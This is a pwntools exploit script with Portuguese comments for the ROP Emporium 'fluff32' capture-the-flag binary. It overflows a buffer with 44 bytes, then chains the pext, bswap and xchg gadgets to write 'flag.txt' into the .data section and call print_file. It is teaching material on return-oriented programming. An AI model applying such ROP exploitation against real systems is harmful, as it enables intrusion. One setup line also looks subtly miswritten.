#!/usr/bin/env python3

from pwn import *

elf = elf.context = ELF('fluff32')
p = process(elf.path)

'''
gdb-peda$ disas questionableGadgets
   0x08048543 <+0>:		mov    eax,ebp
   0x08048545 <+2>:		mov    ebx,0xb0bababa
   0x0804854a <+7>:		pext   edx,ebx,eax
   0x0804854f <+12>:	mov    eax,0xdeadbeef
   0x08048554 <+17>:	ret    
   0x08048555 <+18>:	xchg   BYTE PTR [ecx],dl
   0x08048557 <+20>:	ret    
   0x08048558 <+21>:	pop    ecx
   0x08048559 <+22>:	bswap  ecx
   0x0804855b <+24>:	ret 

bsawp -> troca de little para big endian e vice-versa
xchg -> troca os valores dos registradores passados como operandos
pext -> esse é bem chatinho e vou colocar uma explicação para ele em outro arquivo chamdao 'mask', depois de ler lá volte aqui

O que queremos?
Mover 'flag.txt' para uma seção de que tenha permissão de escrita no meu caso utilizarei a .data
Depois chamamos a função print_fil(data_section)

Mas isso não será tão simples assim porque não temos muitos gadgets bons
A challenge nos fala para procurarmos na questionableGadgets que lá terá gadgets úteis
E realmente, com os gadgets que tem lá conseguimos fazer o que queremos

Vamos começar manipulando ecx <+21>
Precisamos colocar em ecx a nossa seção formatada em big-endian pois a bswap trocará ela para little endian

Depois precisamos manipular o edx para conseguirmos manipular o dl
Vamos usar <+0> até o <+17>
Vamos utlizar os valores descobertos lá no arquivo mask (veja lá)

Com a nossa flag.txt dentro da seção .data basta a gente chamar a função passar um fake return address e depois passar nosso argumento
'''

### GADGETS & ADDRESS ###
pop_ebp = p32(0x080485bb)
pop_ecx_bswap = p32(0x08048558)
pext = p32(0x08048543)
xchg = p32(0x08048555)

function = p32(0x080483d0)
section = 0x0804a018

### EXPLOIT ###
# Faremos um loop para cada byes por conta do dl só aceitar 1 byte

xpl = b''
xpl += b'A' * 44

str = [0xb4b,0x2dd,0x1d46,0xb5a,0xdb,0xacd,0x1ac5,0xacd]
packer = make_packer(32, endian='big', sign='unsigned')
# colocando flag.txt em .data
for i in range(8):
	xpl += pop_ebp
	xpl += p32(str[i])
	xpl += pext # colocando em edi cada caracter consecutivamente

	xpl += pop_ecx_bswap
	xpl += packer(section + i) # a cada volta ele troca para outro caracter

	# dl e ecx preparados, vamos chamar a xchg
	xpl += xchg

# .data preparada vamos executar nosso exploit

xpl += function
xpl += b'A' * 4 # fake return address
xpl += p32(section) # flag.txt

p.sendline(xpl)
p.interactive()
